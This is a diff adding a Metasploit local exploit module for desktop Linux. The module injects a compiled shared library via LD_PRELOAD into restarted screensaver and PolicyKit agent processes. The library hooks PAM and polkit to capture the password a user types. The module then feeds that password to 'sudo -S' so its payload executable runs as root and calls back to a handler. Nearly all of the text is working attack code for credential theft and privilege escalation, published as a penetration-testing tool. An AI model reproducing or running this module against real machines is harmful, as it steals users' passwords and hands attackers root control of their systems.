@@ -1,0 +1,234 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rex'
+require 'msf/core/exploit/exe'
+require 'base64'
+require 'metasm'
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+  include Msf::Exploit::EXE
+  include Msf::Post::File
+
+  def initialize(info={})
+    super( update_info( info, {
+      'Name'          => 'Desktop Linux Password Stealer and Privilege Escalation',
+      'Description'   => %q{
+        This module steals the user password of an administrative user on a desktop Linux system
+        when it is entered for unlocking the screen or for doing administrative actions using
+        PolicyKit. Then, it escalates to root privileges using sudo and the stolen user password.
+        It exploits the design weakness that there is no trusted channel for transferring the
+        password from the keyboard to the actual password verificatition against the shadow file
+        (which is running as root since /etc/shadow is only readable to the root user). Both
+        screensavers (xscreensaver/gnome-screensaver) and PolicyKit use a component running under
+        the current user account to query for the password and then pass it to a setuid-root binary
+        to do the password verification. Therefore, it is possible to inject a password stealer
+        after compromising the user account. Since sudo requires only the user password (and not
+        the root password of the system), stealing the user password of an administrative user
+        directly allows escalating to root privileges. Please note, you have to start a handler
+        as a background job before running this exploit since the exploit will only create a shell
+        when the user actually enters the password (which may be hours after launching the exploit).
+        Using exploit/multi/handler with the option ExitOnSession set to false should do the job.
+      },
+      'License'       => MSF_LICENSE,
+      'Author'        => ['Jakob Lell'],
+      'DisclosureDate' => 'Aug 7 2014',
+      'Platform'      => 'linux',
+      'Arch'          => [ARCH_X86, ARCH_X86_64],
+      'SessionTypes'  => ['shell', 'meterpreter'],
+      'Targets'       =>
+        [
+          ['Linux x86', {'Arch' => ARCH_X86}],
+          ['Linux x86_64', {'Arch' => ARCH_X86_64}]
+        ],
+      'DefaultOptions' =>
+        {
+          'PrependSetresuid' => true,
+          'PrependFork' => true,
+          'DisablePayloadHandler' => true
+        },
+      'DefaultTarget' => 0,
+      }
+    ))
+
+    register_options([
+      OptString.new('WritableDir', [true, 'A directory for storing temporary files on the target system', '/tmp']),
+    ], self.class)
+  end
+
+  def check
+    check_command = 'if which perl && '
+    check_command << 'which sudo && '
+    check_command << 'id|grep -E \'sudo|adm\' && '
+    check_command << 'pidof xscreensaver gnome-screensaver polkit-gnome-authentication-agent-1;'
+    check_command << 'then echo OK;'
+    check_command << 'fi'
+
+    output = cmd_exec(check_command).gsub("\r", '')
+
+    vprint_status(output)
+
+    if output['OK'] == 'OK'
+      return Exploit::CheckCode::Vulnerable
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    # Cannot use generic/shell_reverse_tcp inside an elf
+    # Checking before proceeds
+    pl = generate_payload_exe
+
+    exe_file = "#{datastore['WritableDir']}/#{rand_text_alpha(3 + rand(5))}.elf"
+
+    print_status("Writing payload executable to '#{exe_file}'")
+    write_file(exe_file, pl)
+    cmd_exec("chmod +x #{exe_file}")
+
+
+    cpu = nil
+    if target['Arch'] == ARCH_X86
+      cpu = Metasm::Ia32.new
+    elsif target['Arch'] == ARCH_X86_64
+      cpu = Metasm::X86_64.new
+    end
+    lib_data = Metasm::ELF.compile_c(cpu, c_code(exe_file)).encode_string(:lib)
+    lib_file = "#{datastore['WritableDir']}/#{rand_text_alpha(3 + rand(5))}.so"
+
+    print_status("Writing lib file to '#{lib_file}'")
+    write_file(lib_file,lib_data)
+
+    print_status('Restarting processes (screensaver/policykit)')
+    restart_commands = get_restart_commands
+    restart_commands.each do |cmd|
+      cmd['LD_PRELOAD_PLACEHOLDER'] = lib_file
+      cmd_exec(cmd)
+    end
+    print_status('The exploit module has finished. However, getting a shell will probably take a while (until the user actually enters the password). Remember to keep a handler running.')
+  end
+
+  def get_restart_commands
+    get_cmd_lines = 'pidof xscreensaver gnome-screensaver polkit-gnome-authentication-agent-1|'
+    get_cmd_lines << 'perl -ne \'while(/(\d+)/g){$pid=$1;next unless -r "/proc/$pid/environ";'
+    get_cmd_lines << 'print"PID:$pid\nEXE:".readlink("/proc/$pid/exe")."\n";'
+    get_cmd_lines << '$/=undef;'
+    get_cmd_lines << 'for("cmdline","environ"){open F,"</proc/$pid/$_";print "$_:".unpack("H*",<F>),"\n";}}\''
+
+    text_output = cmd_exec(get_cmd_lines).gsub("\r",'')
+    vprint_status(text_output)
+
+    lines = text_output.split("\n")
+
+    restart_commands = []
+    i=0
+    while i < lines.length - 3
+      m = lines[i].match(/^PID:(\d+)/)
+
+      if m
+        pid = m[1]
+        vprint_status("PID=#{pid}")
+        print_status("Found process: " + lines[i+1])
+
+        exe = lines[i+1].match(/^EXE:(\S+)$/)[1]
+        vprint_status("exe=#{exe}")
+
+        cmdline = [lines[i+2].match(/^cmdline:(\w+)$/)[1]].pack('H*').split("\x00")
+        vprint_status("CMDLINE=" + cmdline.join(' XXX '))
+
+        env = lines[i+3].match(/^environ:(\w+)$/)[1]
+        restart_command = 'perl -e \'use POSIX setsid;open STDIN,"</dev/null";open STDOUT,">/dev/null";open STDERR,">/dev/null";exit if fork;setsid();'
+        restart_command << 'kill(9,' + pid + ')||exit;%ENV=();for(split("\0",pack("H*","' + env + '"))){/([^=]+)=(.*)/;$ENV{$1}=$2}'
+        restart_command << '$ENV{"LD_PRELOAD"}="LD_PRELOAD_PLACEHOLDER";exec {"' + exe + '"} ' + cmdline.map{|x| '"' + x + '"'}.join(", ") + '\''
+
+        vprint_status("RESTART: #{restart_command}")
+        restart_commands.push(restart_command)
+      end
+
+      i+=1
+    end
+
+    restart_commands
+  end
+
+  def c_code(exe_file)
+    c = %Q|
+// A few constants/function definitions/structs copied from header files
+#define RTLD_NEXT      ((void *) -1l)
+extern uintptr_t dlsym(uintptr_t, char*);
+// Define some structs to void so that we can ignore all dependencies from these structs
+#define FILE void
+#define pam_handle_t void
+extern FILE *popen(const char *command, const char *type);
+extern int pclose(FILE *stream);
+extern int fprintf(FILE *stream, const char *format, ...);
+extern char *strstr(const char *haystack, const char *needle);
+extern void *malloc(unsigned int size);
+
+struct pam_message {
+  int msg_style;
+  const char *msg;
+ };
+
+struct pam_response {
+  char *resp;
+  int resp_retcode;
+};
+
+struct pam_conv {
+  int (*conv)(int num_msg, const struct pam_message **msg,
+  struct pam_response **resp, void *appdata_ptr);
+  void *appdata_ptr;
+};
+
+void run_sudo(char* password) {
+  FILE* sudo = popen("sudo -S #{exe_file}", "w");
+  fprintf(sudo,"%s\\n",password);
+  pclose(sudo);
+}
+
+int my_conv(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr) {
+  struct pam_conv *orig_pam_conversation = (struct pam_conv *)appdata_ptr;
+  int i;
+  int passwd_index = -1;
+  for(i=0;i<num_msg;i++){
+    if(strstr(msg[i]->msg,"Password") >= 0){
+      passwd_index = i;
+    }
+  }
+  int result = orig_pam_conversation->conv(num_msg, msg, resp, orig_pam_conversation->appdata_ptr);
+  if(passwd_index >= 0){
+    run_sudo(resp[passwd_index]->resp);
+  }
+  return result;
+}
+
+int pam_start(const char *service_name, const char *user, const struct pam_conv *pam_conversation, pam_handle_t **pamh) __attribute__((export)) {
+  static int (*orig_pam_start)(const char *service_name, const char *user, const struct pam_conv *pam_conversation, pam_handle_t **pamh);
+  if(!orig_pam_start){
+    orig_pam_start = dlsym(RTLD_NEXT,"pam_start");
+  }
+  struct pam_conv *my_pam_conversation = malloc(sizeof(struct pam_conv));
+  my_pam_conversation->conv = &my_conv;
+  my_pam_conversation->appdata_ptr = (struct pam_conv *)pam_conversation;
+  return orig_pam_start(service_name, user, my_pam_conversation, pamh);
+}
+
+void polkit_agent_session_response (void *session, char *response) __attribute__((export)) {
+  static void *(*orig_polkit_agent_session_response)(void *session, char* response);
+  if(!orig_polkit_agent_session_response){
+    orig_polkit_agent_session_response = dlsym(RTLD_NEXT,"polkit_agent_session_response");
+  }
+  run_sudo(response);
+  orig_polkit_agent_session_response(session, response);
+  return;
+}
+|
+    c
+  end
+end
+
